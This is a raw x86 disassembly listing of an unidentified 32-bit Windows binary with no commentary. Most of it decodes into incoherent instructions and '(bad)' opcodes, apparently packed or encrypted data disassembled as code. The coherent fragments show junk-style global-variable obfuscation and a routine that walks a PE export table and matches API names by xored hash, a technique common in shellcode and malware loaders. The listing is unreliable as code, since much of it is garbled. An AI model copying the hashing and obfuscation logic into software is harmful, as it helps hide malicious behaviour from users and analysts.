  40c012:	inc    esp
  40c013:	scas   al,BYTE PTR es:[edi]
  40c014:	jmp    0x7109:0x66b679cb
  40c01b:	enter  0xea2c,0x47
  40c01f:	dec    esi
  40c020:	xor    al,0x3a
  40c022:	jb     0x40bfae
  40c024:	cmp    dl,BYTE PTR [ebx+0x66621a88]
  40c02a:	sbb    esi,DWORD PTR [ebp-0x2e305754]
  40c030:	call   0x7e8b:0xf9844328
  40c037:	leave  
  40c038:	and    eax,0x703663ce
  40c03d:	mov    al,0x25
  40c03f:	mov    BYTE PTR [edx-0xaf11a90],cl
  40c045:	xor    esi,edx
  40c047:	leave  
  40c048:	dec    esp
  40c049:	retf   
  40c04a:	jecxz  0x40c047
  40c04c:	shl    ecx,cl
  40c04e:	adc    al,0xf1
  40c050:	call   0x328f7f5c
  40c055:	imul   ebx,DWORD PTR [edi+edx*8+0x70],0xd4cf7fdd
  40c05d:	and    al,0x9f
  40c05f:	imul   esp,esp,0x4a46eaf7
  40c065:	mov    edi,0x85167a19
  40c06a:	rcl    DWORD PTR [esi+0x17fc861d],0x9d
  40c071:	test   DWORD PTR ds:0x3459a1d1,edi
  40c077:	fcom   DWORD PTR [ecx-0x61]
  40c07a:	call   0x6e21:0x5220ff3d
  40c081:	lock in al,dx
  40c083:	sbb    ebp,DWORD PTR [ebp-0x623b9edb]
  40c089:	jbe    0x40c08b
  40c08b:	add    BYTE PTR cs:[ebx-0x60074995],ch
  40c092:	retf   
  40c093:	lahf   
  40c094:	push   eax
  40c095:	lock add ecx,DWORD PTR [bx+si+0x20]
  40c09a:	mov    eax,ds:0x430542
  40c09f:	or     eax,DWORD PTR ds:0x42ee0c
  40c0a5:	mov    ds:0x430542,eax
  40c0aa:	mov    DWORD PTR [ebp-0x28],ecx
  40c0ad:	mov    eax,DWORD PTR [ebp-0x14]
  40c0b0:	or     DWORD PTR ds:0x42ee1c,0x6327
  40c0ba:	mov    ecx,DWORD PTR [ebp+0x8]
  40c0bd:	add    ecx,DWORD PTR [eax+0x24]
  40c0c0:	mov    eax,ds:0x43049e
  40c0c5:	xor    eax,DWORD PTR ds:0x42e762
  40c0cb:	mov    ds:0x43049e,eax
  40c0d0:	mov    DWORD PTR [ebp-0x2c],ecx
  40c0d3:	and    DWORD PTR ds:0x4304a6,0x0
  40c0dd:	mov    eax,ds:0x4304a6
  40c0e2:	inc    eax
  40c0e3:	mov    ds:0x4304a6,eax
  40c0e8:	cmp    DWORD PTR ds:0x4304a6,0x1b
  40c0ef:	jne    0x40c11d
  40c0f5:	push   0x4304b2
  40c0fa:	push   0x1519
  40c0ff:	push   DWORD PTR [ebp-0x18]
  40c102:	push   0x42e776
  40c107:	push   DWORD PTR [ebp-0x24]
  40c10a:	push   0x42e8f3
  40c10f:	push   DWORD PTR [ebp-0x24]
  40c112:	push   0x667e
  40c117:	call   DWORD PTR ds:0x42eaf4
  40c11d:	cmp    DWORD PTR ds:0x4304a6,0x14
  40c124:	jb     0x40c0dd
  40c12a:	mov    eax,DWORD PTR [ebp-0x14]
  40c12d:	mov    ecx,DWORD PTR [ebp+0x8]
  40c130:	add    ecx,DWORD PTR [eax+0x1c]
  40c133:	xor    esi,esi
  40c135:	jmp    0x40c293
  40c13a:	xchg   ebp,eax
  40c13b:	leave  
  40c13c:	popa   
  40c13d:	jge    0x40c1bc
  40c13f:	jge    0x40c0ee
  40c141:	fldenv [eax-0x2b]
  40c144:	test   al,0xed
  40c146:	scas   eax,DWORD PTR es:[edi]
  40c147:	xor    edx,DWORD PTR [ebp+0x7efd326c]
  40c14d:	jle    0x40c18e
  40c14f:	jg     0x40c1cf
  40c151:	jle    0x40c1bf
  40c153:	sbb    ebp,0x2e
  40c156:	(bad)  
  40c157:	bound  ecx,QWORD PTR [esi+0x44]
  40c15a:	jmp    FWORD PTR [ecx+0x1e0025da]
  40c160:	mov    DWORD PTR [ecx],edi
  40c162:	sbb    bh,0xd0
  40c165:	popf   
  40c166:	and    DWORD PTR [edx+edx*4+0x1abc9164],ebp
  40c16d:	cwde   
  40c16e:	jb     0x40c140
  40c170:	and    eax,0x9a98279e
  40c175:	lea    edi,[ebp-0x1e]
  40c178:	leave  
  40c179:	addr16 in eax,dx
  40c17b:	mov    esi,0xc563e0fe
  40c180:	repnz pusha 
  40c182:	in     eax,dx
  40c183:	inc    edi
  40c184:	mov    ah,0xb
  40c186:	addr16 mov al,ds:0x364c
  40c18a:	cmp    ebp,DWORD PTR [ebx+0x786c75a5]
  40c190:	cmp    ch,BYTE PTR [esp+ebp*4+0x3]
  40c194:	jl     0x40c1bd
  40c196:	int3   
  40c197:	loopne 0x40c197
  40c199:	(bad)  
  40c19a:	mov    ebp,0x5450bfb1
  40c19f:	and    BYTE PTR [ebp+0x3371ebc5],ch
  40c1a5:	ds jmp 0xe4a:0xe5b870b3
  40c1ad:	mov    DWORD PTR [ebx],esp
  40c1af:	pop    esi
  40c1b0:	cmc    
  40c1b1:	in     eax,0x37
  40c1b3:	and    al,0xc5
  40c1b5:	mov    ah,0x13
  40c1b7:	int    0x80
  40c1b9:	xchg   edx,eax
  40c1ba:	cmp    BYTE PTR [bx+di+0x351d],cl
  40c1bf:	imul   edx,DWORD PTR [ebp+0x2f501016],0x600de7e7
  40c1c9:	daa    
  40c1ca:	and    al,0x54
  40c1cc:	push   cs
  40c1cd:	(bad)  
  40c1ce:	pop    ebp
  40c1cf:	sbb    eax,0x71afcf21
  40c1d4:	sti    
  40c1d5:	and    bl,BYTE PTR [ebx+0x62033098]
  40c1db:	add    esi,esp
  40c1dd:	test   DWORD PTR [ebp+0x3c],ecx
  40c1e0:	cld    
  40c1e1:	xor    al,0x4a
  40c1e3:	fdivr  QWORD PTR [ebx+0xd]
  40c1e6:	pop    ds
  40c1e7:	jno    0x40c1c1
  40c1e9:	fidivr WORD PTR [edx]
  40c1eb:	dec    ebx
  40c1ec:	inc    edi
  40c1ed:	test   ebp,esi
  40c1ef:	inc    esi
  40c1f0:	pop    ebp
  40c1f1:	bound  ecx,QWORD PTR [edx+0x3e]
  40c1f4:	mov    dh,0xc8
  40c1f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c1f7:	ins    BYTE PTR es:[edi],dx
  40c1f8:	(bad)  
  40c1fa:	not    DWORD PTR [ebp-0x5a]
  40c1fd:	fnstenv [eax]
  40c1ff:	xchg   ax,ax
  40c201:	and    al,0xfc
  40c203:	sti    
  40c204:	rcl    BYTE PTR [ecx+0x5b974c83],1
  40c20a:	pop    es
  40c20b:	sahf   
  40c20c:	rcl    DWORD PTR [ebp+0x68],1
  40c20f:	dec    esp
  40c210:	adc    al,0x2d
  40c212:	sub    al,0x9d
  40c214:	mov    dl,0x70
  40c216:	(bad)  
  40c217:	sub    dh,BYTE PTR [eiz*2+0x4c735403]
  40c21e:	xchg   ecx,eax
  40c21f:	arpl   WORD PTR [edx-0x5cf9efc7],si
  40c225:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c226:	pop    edi
  40c227:	xchg   DWORD PTR [edi-0x15e89d6],ebx
  40c22d:	pop    eax
  40c22e:	jb     0x40c26d
  40c230:	jb     0x40c210
  40c232:	jp     0x40c21e
  40c234:	mov    ebp,0xdd84bb3f
  40c239:	pop    ebx
  40c23a:	dec    eax
  40c23b:	mov    ds:0x91a2004d,eax
  40c240:	sub    DWORD PTR [edx+0x124260df],edx
  40c246:	mov    bh,0xb3
  40c248:	popa   
  40c249:	enter  0x51da,0x9c
  40c24d:	call   0xad86da81
  40c252:	push   ecx
  40c253:	call   0xae5f999e
  40c258:	inc    ebx
  40c259:	aaa    
  40c25a:	rol    DWORD PTR [esi-0x49],cl
  40c25d:	mov    ah,0xcc
  40c25f:	(bad)  
  40c260:	and    al,0x21
  40c262:	push   ds
  40c263:	in     al,dx
  40c264:	pop    ebx
  40c265:	sbb    eax,0xfbf8ad2a
  40c26a:	adc    al,0x2d
  40c26c:	pop    ds
  40c26d:	mov    edx,0x588d85c9
  40c272:	jmp    FWORD PTR [ebx+0x68]
  40c275:	or     eax,0x429d2f15
  40c27a:	cwde   
  40c27b:	adc    DWORD PTR [edx-0x60],ecx
  40c27e:	inc    ebp
  40c27f:	xlat   BYTE PTR ds:[ebx]
  40c280:	enter  0x8bc2,0xa
  40c284:	mov    esp,0x464686cb
  40c289:	arpl   WORD PTR [edx-0xb714376],si
  40c28f:	add    DWORD PTR [ecx+eax*2-0x13b276f8],eax
  40c296:	mov    eax,DWORD PTR [ebp-0x28]
  40c299:	mov    ecx,DWORD PTR [ebp+0x8]
  40c29c:	add    ecx,DWORD PTR [eax+edi*4]
  40c29f:	jmp    0x40c3fd
  40c2a4:	lea    edx,[esi-0x1a42cd67]
  40c2aa:	pop    ebp
  40c2ab:	imul   edx,DWORD PTR ds:0x99e92bcc,0xf3fab2bc
  40c2b5:	(bad)  
  40c2b6:	jle    0x40c336
  40c2b8:	aas    
  40c2b9:	jg     0x40c339
  40c2bb:	jle    0x40c248
  40c2bd:	loop   0x40c251
  40c2bf:	mov    gs,WORD PTR [ecx+0x7b0a3221]
  40c2c5:	or     al,BYTE PTR [esi]
  40c2c7:	push   esi
  40c2c8:	fs mov ch,0xd4
  40c2cb:	aad    0x95
  40c2cd:	lea    ebx,[edi-0x3]
  40c2d0:	sub    eax,0xbf9f360
  40c2d5:	jo     0x40c26d
  40c2d7:	out    dx,eax
  40c2d8:	je     0x40c270
  40c2da:	push   ebp
  40c2db:	fcomp  QWORD PTR [eax+0x6c]
  40c2de:	imul   esp,DWORD PTR es:[edi-0x36d1198d],0x7faee2b7
  40c2e9:	xchg   edi,eax
  40c2ea:	popf   
  40c2eb:	push   edx
  40c2ec:	ret    
  40c2ed:	stos   BYTE PTR es:[edi],al
  40c2ee:	cdq    
  40c2ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c2f0:	dec    edx
  40c2f1:	int    0x33
  40c2f3:	add    ah,BYTE PTR [esi-0x6]
  40c2f6:	xchg   edx,eax
  40c2f7:	cmp    eax,0xb8804a63
  40c2fc:	loopne 0x40c2d8
  40c2fe:	ret    
  40c2ff:	sbb    al,BYTE PTR [edx+ebx*8+0x12]
  40c303:	ret    0xbe26
  40c306:	jg     0x40c32a
  40c308:	xchg   ecx,eax
  40c309:	call   0x646813db
  40c30e:	dec    ebx
  40c30f:	mov    eax,ds:0x8bf18506
  40c314:	adc    DWORD PTR [eax],0xffffffab
  40c317:	jmp    0x8c62:0x5c67f1a7
  40c31e:	mov    al,ds:0x165c6013
  40c323:	add    DWORD PTR [esi-0x67],ecx
  40c326:	mov    DWORD PTR [ebp+0x27],eax
  40c329:	or     cl,ch
  40c32b:	aaa    
  40c32c:	cld    
  40c32d:	shr    ebx,0xda
  40c330:	dec    ecx
  40c331:	xor    ebp,DWORD PTR [esi-0x3]
  40c334:	sbb    eax,0xfedfab16
  40c339:	or     edx,edx
  40c33b:	lods   al,BYTE PTR ds:[esi]
  40c33c:	lds    edx,FWORD PTR [ebp-0x544f3ba6]
  40c342:	in     al,dx
  40c343:	pop    esi
  40c344:	xchg   esi,eax
  40c345:	inc    edx
  40c346:	inc    esp
  40c347:	adc    BYTE PTR [ebx-0x59070500],bh
  40c34d:	leave  
  40c34e:	or     eax,0x4e0e121e
  40c353:	fwait
  40c354:	call   0x9ab8:0x3036d876
  40c35b:	fsubr  DWORD PTR [ebx+0x4c255112]
  40c361:	shr    DWORD PTR [edx+edi*1],0x5d
  40c365:	enter  0x45f5,0x4b
  40c369:	popf   
  40c36a:	in     eax,0x86
  40c36c:	adc    dl,BYTE PTR [ebp+0x21]
  40c36f:	arpl   WORD PTR [ecx],bx
  40c371:	clc    
  40c372:	cmp    DWORD PTR [edx+0x49196bb2],esi
  40c378:	inc    ecx
  40c379:	les    esi,FWORD PTR [edi-0x8]
  40c37c:	stos   BYTE PTR es:[edi],al
  40c37d:	call   0xf7f4:0x71868ae0
  40c384:	mov    ds:0xb88ea8c3,al
  40c389:	push   0x64
  40c38b:	addr16 mov ebx,0xbb54389
  40c391:	mov    WORD PTR [eax-0x59c2d36a],ss
  40c397:	dec    edx
  40c398:	sub    DWORD PTR [edi+0xa1bfdd0],0x36
  40c39f:	xchg   edi,eax
  40c3a0:	call   0x280c:0x1b38118f
  40c3a7:	mov    bh,0xd6
  40c3a9:	into   
  40c3aa:	mov    ds:0x5625bc1,eax
  40c3af:	mov    ebx,0xc5016d46
  40c3b4:	das    
  40c3b5:	cmp    eax,0xa3cdce7
  40c3ba:	or     BYTE PTR [edx+0x16afa2cb],0x65
  40c3c1:	jle    0x40c354
  40c3c3:	sub    DWORD PTR [ecx],0x9522857c
  40c3c9:	frstor [edx*8+0x14f0717c]
  40c3d0:	enter  0x592e,0xb3
  40c3d4:	jmp    ebp
  40c3d6:	inc    ebx
  40c3d7:	mov    esi,0x3772104e
  40c3dc:	cmc    
  40c3dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c3de:	inc    esi
  40c3df:	pop    ds
  40c3e0:	xchg   ebx,eax
  40c3e1:	imul   esp,ecx,0x20
  40c3e4:	out    0xf,eax
  40c3e6:	xor    esp,0x2c
  40c3e9:	inc    ebp
  40c3ea:	sbb    eax,0xa5756d83
  40c3ef:	bound  edx,QWORD PTR [ebp-0xf]
  40c3f2:	jmp    0x671e:0xdacdfe50
  40c3f9:	bnd call 0x45cddbdf
  40c3ff:	clc    
  40c400:	jmp    0x40c55e
  40c405:	and    DWORD PTR [edx-0x5462d589],ebp
  40c40b:	and    eax,0xb3c66ebd
  40c410:	sti    
  40c411:	fld    TBYTE PTR [esi-0x19]
  40c414:	push   0x7e7effb4
  40c419:	aas    
  40c41a:	jg     0x40c49a
  40c41c:	jle    0x40c47e
  40c41e:	repnz sub eax,0xbd3d0f23
  40c424:	mov    al,ds:0xd192c1eb
  40c429:	xlat   BYTE PTR ds:[ebx]
  40c42a:	jmp    0xa7f6e43a
  40c42f:	pop    ebp
  40c430:	mov    ds:0x21f10f68,al
  40c435:	push   0x6cc9a299
  40c43a:	push   edx
  40c43b:	stos   BYTE PTR es:[edi],al
  40c43c:	test   eax,0x92fbef2f
  40c441:	in     al,dx
  40c442:	loope  0x40c418
  40c444:	es jecxz 0x40c3e8
  40c447:	mov    cl,0xd3
  40c449:	call   0x55cf:0xd92b45b0
  40c450:	repz aad 0x2c
  40c453:	and    DWORD PTR [edx],esp
  40c455:	xor    eax,eax
  40c457:	pop    ebx
  40c458:	rcr    BYTE PTR [ecx],0x30
  40c45b:	(bad)  
  40c45c:	cli    
  40c45d:	pop    eax
  40c45e:	pop    edx
  40c45f:	mov    ds:0x42500f53,al
  40c464:	add    al,0xf0
  40c466:	xchg   edi,eax
  40c467:	jl     0x40c4c9
  40c469:	dec    esp
  40c46a:	sbb    bl,BYTE PTR [ebx]
  40c46c:	xchg   edx,eax
  40c46d:	popa   
  40c46e:	pop    ebp
  40c46f:	fcmove st,st(5)
  40c471:	xchg   esp,eax
  40c472:	out    dx,al
  40c473:	mov    dh,0xaa
  40c475:	jp     0x40c4d5
  40c477:	sub    eax,0x10dc5fa6
  40c47c:	sub    DWORD PTR [edi-0xd5f1c0b],esp
  40c482:	call   DWORD PTR [edx-0x5cdcb32]
  40c488:	inc    edi
  40c489:	adc    eax,0x850c4481
  40c48e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c48f:	sbb    BYTE PTR [bx-0x4c],0x5e
  40c494:	sub    DWORD PTR [ebp+0x71fee3c9],ebp
  40c49a:	push   ebx
  40c49b:	add    DWORD PTR [edx+ebp*2-0x3bce4b56],0x4a
  40c4a3:	dec    esp
  40c4a4:	mov    cl,0x82
  40c4a6:	xor    esi,DWORD PTR [esi-0x2f]
  40c4a9:	cwde   
  40c4aa:	out    dx,eax
  40c4ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c4ac:	and    ch,dl
  40c4ae:	test   DWORD PTR [edi+0x79aaee42],ecx
  40c4b4:	cmp    edi,DWORD PTR [ecx-0x2d]
  40c4b7:	hlt    
  40c4b8:	dec    esp
  40c4b9:	ja     0x40c4f8
  40c4bb:	(bad)  [edi]
  40c4bd:	adc    DWORD PTR [edx],ecx
  40c4bf:	and    ecx,DWORD PTR [ecx+eax*2-0x47df2f39]
  40c4c6:	leave  
  40c4c7:	sub    eax,0x6a05da3e
  40c4cc:	mov    bh,BYTE PTR ds:0x35ee8f6d
  40c4d2:	sti    
  40c4d3:	xchg   ebp,eax
  40c4d4:	jl     0x40c534
  40c4d6:	xchg   ebp,eax
  40c4d7:	in     al,0x6e
  40c4d9:	dec    eax
  40c4da:	fnstsw WORD PTR [edx+0x30c869ce]
  40c4e0:	es (bad) 
  40c4e2:	fdiv   DWORD PTR [ebx-0x13]
  40c4e5:	arpl   ax,si
  40c4e7:	lods   al,BYTE PTR ds:[esi]
  40c4e8:	xlat   BYTE PTR ds:[ebx]
  40c4e9:	sti    
  40c4ea:	pop    esi
  40c4eb:	xchg   esp,eax
  40c4ec:	(bad)  
  40c4ed:	(bad)  
  40c4ee:	sub    eax,0xcf11cf47
  40c4f3:	repnz or ch,BYTE PTR [ebx]
  40c4f6:	bound  ebx,QWORD PTR [ecx+ebx*8-0x7f]
  40c4fa:	clc    
  40c4fb:	and    esp,0x594fc297
  40c501:	loopne 0x40c4f9
  40c503:	sbb    ecx,ebp
  40c505:	rcl    ecx,1
  40c507:	xor    al,0x4f
  40c509:	xchg   esp,eax
  40c50a:	xor    eax,eax
  40c50c:	lea    edx,[ebx-0x540c35be]
  40c512:	add    cl,0x30
  40c515:	(bad)  
  40c516:	sub    BYTE PTR ds:0x98a9aa33,cl
  40c51c:	or     BYTE PTR [ebp+0x76],ch
  40c51f:	xor    DWORD PTR [bx+si],edx
  40c522:	push   ds
  40c523:	call   0xff16:0x7744c340
  40c52a:	cmp    ah,bh
  40c52c:	lahf   
  40c52d:	jmp    0x2e4f557b
  40c532:	mov    cs,WORD PTR [ecx+edi*1]
  40c535:	in     eax,dx
  40c536:	add    dl,BYTE PTR [eax+0x2c8ef2cf]
  40c53c:	jno    0x40c4c6
  40c53e:	sti    
  40c53f:	fwait
  40c540:	push   edi
  40c541:	push   es
  40c542:	sub    BYTE PTR [edi+0x5d],ch
  40c545:	ret    0x12d5
  40c548:	ins    BYTE PTR es:[edi],dx
  40c549:	aam    0x1
  40c54b:	bound  ebp,QWORD PTR ds:0xe2c2f11
  40c551:	or     BYTE PTR cs:[ecx+0x3d],ch
  40c555:	std    
  40c556:	pop    es
  40c557:	dec    ebx
  40c558:	out    0x6a,al
  40c55a:	data16 mov bl,0x4f
  40c55d:	fimul  DWORD PTR [ecx-0xaf2fb3]
  40c563:	jne    0x40c535
  40c565:	push   DWORD PTR [ebp+0xc]
  40c568:	call   0x406fc8
  40c56d:	mov    eax,DWORD PTR [ebp-0x4]
  40c570:	jmp    0x40c6ce
  40c575:	push   esi
  40c576:	sahf   
  40c577:	sbb    al,0x64
  40c579:	fdivr  QWORD PTR [esi+edx*2-0x44]
  40c57d:	or     esi,DWORD PTR [esi-0x27]
  40c580:	cmp    eax,0xef69e1aa
  40c585:	jne    0x40c578
  40c587:	jle    0x40c607
  40c589:	aas    
  40c58a:	jg     0x40c60a
  40c58c:	jle    0x40c59a
  40c58e:	and    DWORD PTR fs:[edx],ecx
  40c591:	fisttp WORD PTR [eax+0x58477078]
  40c597:	inc    edi
  40c598:	sbb    eax,0x3bfc6085
  40c59d:	xchg   BYTE PTR [ebx+0x51],ch
  40c5a0:	mov    dl,bh
  40c5a2:	leave  
  40c5a3:	mov    ebx,0x7afcc343
  40c5a8:	jno    0x40c5f0
  40c5aa:	aas    
  40c5ab:	dec    eax
  40c5ac:	sbb    BYTE PTR [esi+ecx*8-0x5dcb6004],al
  40c5b3:	adc    BYTE PTR [ecx-0x759b5f6f],dh
  40c5b9:	dec    esi
  40c5ba:	cs pop ds
  40c5bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c5bd:	fidivr WORD PTR [eax+0x28]
  40c5c0:	ret    0xe9b6
  40c5c3:	mov    dh,0x5a
  40c5c5:	pop    edx
  40c5c6:	xchg   ecx,eax
  40c5c7:	shr    BYTE PTR [ebx-0x634d3f92],0x28
  40c5ce:	cmp    esp,DWORD PTR [esi]
  40c5d0:	cmp    al,0x8
  40c5d2:	mov    bl,0x37
  40c5d4:	jmp    0xedd9:0x84e1ea7f
  40c5db:	or     cl,cl
  40c5dd:	rol    BYTE PTR [ebx+0x5],1
  40c5e0:	cs pushf 
  40c5e2:	retf   0x479d
  40c5e5:	xor    cl,BYTE PTR [ebx]
  40c5e7:	jnp    0x40c5ce
  40c5e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c5ea:	mov    al,0x39
  40c5ec:	push   es
  40c5ed:	imul   edx,DWORD PTR [esi+0x73],0xffffffb1
  40c5f1:	daa    
  40c5f2:	xor    DWORD PTR [ebp+0x1d],ebp
  40c5f5:	(bad)  
  40c5f6:	pop    ax
  40c5f8:	mov    ch,0x22
  40c5fa:	sti    
  40c5fb:	push   es
  40c5fc:	(bad)  
  40c5fd:	and    eax,0xa8eba1cd
  40c602:	jno    0x40c678
  40c604:	add    cl,ch
  40c606:	sbb    al,dl
  40c608:	inc    ebx
  40c609:	push   fs
  40c60b:	mov    cl,BYTE PTR [esi]
  40c60d:	or     cl,BYTE PTR [eax-0x722d002b]
  40c613:	sub    BYTE PTR [edx-0x2da7c292],ah
  40c619:	cmc    
  40c61a:	push   ecx
  40c61b:	dec    esi
  40c61c:	mov    dh,0xb2
  40c61e:	xor    eax,0x4f2fb28a
  40c623:	jo     0x40c663
  40c625:	pop    ebp
  40c626:	sahf   
  40c627:	ss cli 
  40c629:	or     eax,0x1349fe7
  40c62e:	cmp    DWORD PTR [esi-0x7a],esp
  40c631:	(bad)  
  40c632:	mov    ebx,0xbfa517bc
  40c637:	mov    edx,0x67ec4ef
  40c63c:	mov    al,0xde
  40c63e:	adc    edi,DWORD PTR [edi-0x55d2eab1]
  40c644:	jmp    0x40c68d
  40c646:	mov    fs,WORD PTR [edi]
  40c648:	inc    edx
  40c649:	imul   ebx,DWORD PTR [eax+ebp*8],0xfffffff4
  40c64d:	mov    eax,ds:0xa937a0b8
  40c652:	ins    DWORD PTR es:[edi],dx
  40c653:	test   DWORD PTR [eax],ebx
  40c655:	rol    DWORD PTR [eax],0xe6
  40c658:	push   0xa0ef5bed
  40c65d:	mov    edx,eax
  40c65f:	lock mov esi,DWORD PTR fs:[ebx+ecx*2]
  40c664:	inc    edi
  40c665:	lahf   
  40c666:	jbe    0x40c613
  40c668:	retf   
  40c669:	sbb    DWORD PTR [esi+0x45],ebp
  40c66c:	inc    edi
  40c66d:	inc    edi
  40c66e:	xor    dl,BYTE PTR [esi+0x2c]
  40c671:	mov    cl,0x71
  40c673:	test   BYTE PTR [ebx],cl
  40c675:	mov    BYTE PTR [ebx+ebx*2],cl
  40c678:	dec    esi
  40c679:	add    BYTE PTR [bp+si-0x1215],dh
  40c67e:	mov    ch,0xa
  40c680:	out    dx,al
  40c681:	lods   eax,DWORD PTR ds:[esi]
  40c682:	pop    ss
  40c683:	imul   esp,esi,0xffffffe2
  40c686:	sub    BYTE PTR [ecx+0x6d],0xe7
  40c68a:	mov    BYTE PTR [ebp+0x1acb5be5],dh
  40c690:	add    ecx,DWORD PTR [eax+0x69]
  40c693:	fcmovnb st,st(1)
  40c695:	jle    0x40c70d
  40c697:	fimul  WORD PTR ds:0x1e246476
  40c69d:	xchg   ebp,eax
  40c69e:	in     eax,dx
  40c69f:	ss mov bh,0xe1
  40c6a2:	mov    edx,0xaa0c972
  40c6a7:	inc    ebp
  40c6a8:	test   DWORD PTR [eax],0x52d6119c
  40c6ae:	jne    0x40c6ed
  40c6b0:	xor    ecx,DWORD PTR [eax]
  40c6b2:	loop   0x40c65f
  40c6b4:	cli    
  40c6b5:	test   DWORD PTR ds:0x2bf62360,edx
  40c6bb:	push   edx
  40c6bc:	in     eax,dx
  40c6bd:	sub    edx,DWORD PTR [esi+0x62]
  40c6c0:	mov    dh,0x38
  40c6c2:	mov    ch,0xe5
  40c6c4:	add    edi,DWORD PTR [ecx+0xa247874]
  40c6ca:	xchg   esp,eax
  40c6cb:	push   ecx
  40c6cc:	test   al,0x14
  40c6ce:	mov    ecx,DWORD PTR [ebp-0x8]
  40c6d1:	xor    eax,0x7510856
  40c6d6:	add    eax,ebx
  40c6d8:	cmp    ecx,eax
  40c6da:	jne    0x40c6fd
  40c6e0:	mov    eax,DWORD PTR [ebp-0x20]
  40c6e3:	inc    edi
  40c6e4:	cmp    edi,eax
  40c6e6:	jb     0x40b937
  40c6ec:	jmp    0x40c70d
  40c6f1:	mov    eax,DWORD PTR [ebp-0x4]
  40c6f4:	xor    eax,esi
  40c6f6:	add    eax,ebx
  40c6f8:	jmp    0x40e0f7
  40c6fd:	mov    eax,DWORD PTR [ebp-0x2c]
  40c700:	movzx  eax,WORD PTR [eax+edi*2]
  40c704:	mov    ecx,DWORD PTR [ebp-0x14]
  40c707:	mov    eax,DWORD PTR [ecx+eax*4]
  40c70a:	mov    DWORD PTR [ebp+0xc],eax
  40c70d:	mov    eax,DWORD PTR [ebp-0x4]
  40c710:	mov    ecx,DWORD PTR [ebp-0x8]
  40c713:	xor    eax,0x7510856
  40c718:	add    eax,ebx
  40c71a:	cmp    ecx,eax
  40c71c:	jne    0x40c88d
  40c722:	mov    eax,DWORD PTR [ebp-0x4]
  40c725:	xor    eax,0x7510856
  40c72a:	jmp    0x40c6f6
  40c72f:	jmp    0x40c88d
  40c734:	pop    eax
  40c735:	mov    WORD PTR ds:0x5da1fd90,?
  40c73b:	jl     0x40c715
  40c73d:	xchg   ecx,eax
  40c73e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c740:	cwde   
  40c741:	xor    cl,cl
  40c743:	fidiv  WORD PTR [esi]
  40c745:	bnd jle 0x40c7c6
  40c748:	aas    
  40c749:	jg     0x40c7c9
  40c74b:	jle    0x40c76d
  40c74d:	sub    al,BYTE PTR [esi-0x65]
  40c750:	fcom   DWORD PTR [edi]
  40c752:	pop    ecx
  40c753:	clc    
  40c754:	pop    eax
  40c755:	out    0x5a,al
  40c757:	xchg   DWORD PTR [ecx+ebp*2-0x38],ebx
  40c75b:	dec    edx
  40c75c:	push   es
  40c75d:	jmp    0x1dca:0xf55d4181
  40c764:	test   al,0x3d
  40c766:	push   ds
  40c767:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c768:	test   BYTE PTR [esp+ebp*4-0x4d3a7026],cl
  40c76f:	mov    esp,0x93ac2b95
  40c774:	les    esp,FWORD PTR [edi-0x4ce3e267]
  40c77a:	jne    0x40c707
  40c77c:	(bad)  [ebx]
  40c77e:	popa   
  40c77f:	test   al,0x6d
  40c781:	and    eax,0x5a1a0de4
  40c786:	mov    ebx,0xec49e378
  40c78b:	and    eax,0x5714627
  40c790:	push   esp
  40c791:	aad    0x67
  40c793:	sub    edi,DWORD PTR [ebx-0x9e32572]
  40c799:	outs   dx,DWORD PTR ds:[esi]
  40c79a:	add    ah,BYTE PTR [ebx]
  40c79c:	lock xchg ecx,eax
  40c79e:	or     eax,DWORD PTR [ebx+ebp*4-0x57efcece]
  40c7a5:	mov    eax,DWORD PTR [esp+ebx*1+0x25]
  40c7a9:	aaa    
  40c7aa:	pop    ebp
  40c7ab:	shl    ebx,cl
  40c7ad:	jge    0x40c769
  40c7af:	mov    eax,ds:0x3cc7a92e
  40c7b4:	sbb    al,0x59
  40c7b6:	add    DWORD PTR [ebx],ecx
  40c7b8:	cmp    edi,DWORD PTR [esi-0x2]
  40c7bb:	xchg   ebp,eax
  40c7bc:	pop    es
  40c7bd:	mov    esi,DWORD PTR [esi+0x78]
  40c7c0:	xlat   BYTE PTR ds:[ebx]
  40c7c1:	addr16 imul esi,esi,0x9a7b7500
  40c7c8:	or     ebx,DWORD PTR [esi+0x509f305d]
  40c7ce:	bound  ebx,QWORD PTR [ecx]
  40c7d0:	mov    edx,0x7444e455
  40c7d5:	or     edx,edi
  40c7d7:	(bad)  
  40c7d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c7d9:	div    DWORD PTR [esi-0xc]
  40c7dc:	lahf   
  40c7dd:	loop   0x40c844
  40c7df:	mov    ebp,0x9727de8d
  40c7e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c7e5:	cli    
  40c7e6:	imul   ebp,esi,0xa0b2dfca
  40c7ec:	in     eax,dx
  40c7ed:	sub    esp,DWORD PTR [eax-0x14]
  40c7f0:	or     DWORD PTR [ebp-0x20],edi
  40c7f3:	je     0x40c7fe
  40c7f5:	call   0x52d6133b
  40c7fa:	xor    eax,0x683f8de2
  40c7ff:	xor    BYTE PTR [eax],0xf2
  40c802:	(bad)  
  40c803:	sub    esi,DWORD PTR [edx-0x1356568e]
  40c809:	adc    DWORD PTR [eax+esi*4+0x16],esi
  40c80d:	sbb    al,0xd0
  40c80f:	test   BYTE PTR [ebx],dl
  40c811:	and    al,0xce
  40c813:	fistp  QWORD PTR [edx]
  40c815:	xchg   ebp,eax
  40c816:	cs jbe 0x40c88a
  40c819:	sub    edi,edi
  40c81b:	push   ebp
  40c81c:	or     al,0x63
  40c81e:	stos   BYTE PTR es:[edi],al
  40c81f:	inc    eax
  40c820:	mov    ebp,0x696e4146
  40c825:	lods   eax,DWORD PTR ds:[esi]
  40c826:	xlat   BYTE PTR ds:[ebx]
  40c827:	or     esp,DWORD PTR ds:0x9a690e9e
  40c82d:	outs   dx,BYTE PTR ds:[esi]
  40c82e:	add    edx,DWORD PTR [ebp+0x10]
  40c831:	(bad)  
